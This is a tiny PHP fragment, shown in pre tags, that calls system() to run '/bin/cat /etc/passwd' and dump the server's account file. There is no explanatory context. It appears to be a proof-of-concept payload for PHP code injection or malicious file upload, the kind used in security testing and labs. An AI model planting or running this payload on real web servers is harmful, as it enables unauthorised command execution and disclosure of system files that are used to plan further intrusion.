<pre>
<?php
  system('/bin/cat /etc/passwd');
?>
</pre>
